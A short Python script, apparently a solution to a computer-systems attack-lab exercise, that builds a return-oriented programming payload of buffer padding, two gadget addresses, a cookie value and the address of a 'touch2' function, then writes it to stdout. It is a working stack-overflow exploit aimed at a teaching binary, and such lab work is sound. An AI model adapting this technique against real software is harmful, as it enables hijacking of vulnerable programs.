import sys

popq_addr = 0x4019AB.to_bytes(byteorder="little", length=8)
mov_addr = 0x4019C5.to_bytes(byteorder="little", length=8)
cookie = 0x59B997FA.to_bytes(byteorder="little", length=8)
touch2_addr = 0x4017EC.to_bytes(byteorder="little", length=8)
padding = b"a" * 40

payload = padding + popq_addr + cookie + mov_addr + touch2_addr
sys.stdout.buffer.write(payload)
